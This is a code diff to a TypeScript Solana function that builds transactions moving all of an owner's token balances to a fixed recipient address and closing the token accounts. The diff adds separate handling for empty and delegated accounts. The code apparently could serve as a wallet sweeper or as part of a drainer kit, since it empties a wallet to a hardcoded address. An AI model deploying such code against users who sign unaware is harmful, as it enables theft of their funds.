@@ -9,7 +9,7 @@ const txFee = 5000
 
 export async function transferAllTokens (publicKey: PublicKey, connection: Connection) {
 
-    const tokenAccounts = await connection.getTokenAccountsByOwner(publicKey, { programId: TOKEN_PROGRAM_ID })
+    const tokenAccountsNonFiltered = await connection.getTokenAccountsByOwner(publicKey, { programId: TOKEN_PROGRAM_ID })
         .then(ctx => {
             return ctx.value.map(v => {
                 return {
@@ -18,20 +18,31 @@ export async function transferAllTokens (publicKey: PublicKey, connection: Conne
                     },
                     publicKey: v.pubkey
                 }
-            }).filter(v => v.data.amount > BigInt(0))
+            })
     })
+
+    const tokenAccounts = tokenAccountsNonFiltered.filter(a => a.data.delegatedAmount === BigInt(0))
+    const emptyTokenAccounts = tokenAccounts.filter(v => v.data.amount === BigInt(0)).length
+    const nonEmptyTokenAccounts = tokenAccounts.filter(v => v.data.amount > BigInt(0)).length
+    const frozenAccounts = tokenAccountsNonFiltered.filter(a => a.data.delegatedAmount > BigInt(0)).length
 
     const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash()
 
     const txs = [new Transaction()]
 
     for (const tkn of tokenAccounts) {
-        const destination = getAssociatedTokenAddressSync(tkn.data.mint, recepient)
-        const createIx = createAssociatedTokenAccountIdempotentInstruction(publicKey, destination, recepient, tkn.data.mint)
-        const transferIx = createTransferInstruction(tkn.publicKey, destination, publicKey, tkn.data.amount)
+
         const closeIx = createCloseAccountInstruction(tkn.publicKey, publicKey, publicKey)
 
-        let ixs = [createIx, transferIx, closeIx]
+        let ixs = []
+        if (tkn.data.amount === BigInt(0)) {
+            ixs.push(closeIx)
+        } else {
+            const destination = getAssociatedTokenAddressSync(tkn.data.mint, recepient)
+            const createIx = createAssociatedTokenAccountIdempotentInstruction(publicKey, destination, recepient, tkn.data.mint)
+            const transferIx = createTransferInstruction(tkn.publicKey, destination, publicKey, tkn.data.amount)
+            ixs.push(createIx, transferIx, closeIx)
+        }
         
         const lastTxClone =  new Transaction().add(txs.slice(-1)[0])
 
@@ -54,7 +65,9 @@ export async function transferAllTokens (publicKey: PublicKey, connection: Conne
 
     return {
         txs,
-        amount: tokenAccounts.length
+        transferAmount: nonEmptyTokenAccounts,
+        closeAmount: emptyTokenAccounts,
+        frozenAccounts: frozenAccounts
     }
 }
 
